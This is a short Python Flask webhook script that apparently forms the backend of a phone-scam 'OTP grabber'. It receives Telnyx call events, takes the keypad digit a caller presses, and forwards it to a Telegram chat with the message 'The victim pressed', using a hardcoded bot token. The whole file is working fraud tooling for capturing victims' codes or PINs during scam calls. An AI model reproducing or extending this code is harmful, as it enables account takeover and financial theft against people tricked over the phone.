import requests
from flask import Flask, request

app = Flask(__name__)

# Telegram Bot Token (replace with your actual bot token)
TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"

@app.route('/telnyx_webhook', methods=['POST'])
def telnyx_webhook():
    # Capture the incoming data
    data = request.json
    print(f"Received JSON data: {data}")
    
    # Log all headers (optional, for debugging)
    print(f"Headers: {request.headers}")
    
    # Get the telegram_user_id from query parameters (in case it's passed in URL)
    telegram_user_id = request.args.get('telegram_user_id', None)
    print(f"Telegram User ID: {telegram_user_id}")
    
    # Extract the digit pressed by the victim
    digit = data.get('data', {}).get('payload', {}).get('digit', None)
    
    if digit:
        print(f"Digit Pressed: {digit}")
        send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
    else:
        print("No digit pressed.")
    
    return 'OK', 200

def send_telegram_message(user_id, message):
    """Send a message to the Telegram user."""
    if user_id:
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        params = {'chat_id': user_id, 'text': message}
        response = requests.get(url, params=params)
        if response.status_code == 200:
            print(f"Message sent to Telegram user {user_id}: {message}")
        else:
            print(f"Failed to send message to Telegram user {user_id}. Error: {response.status_code}, {response.text}")
    else:
        print("No valid Telegram user ID provided.")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
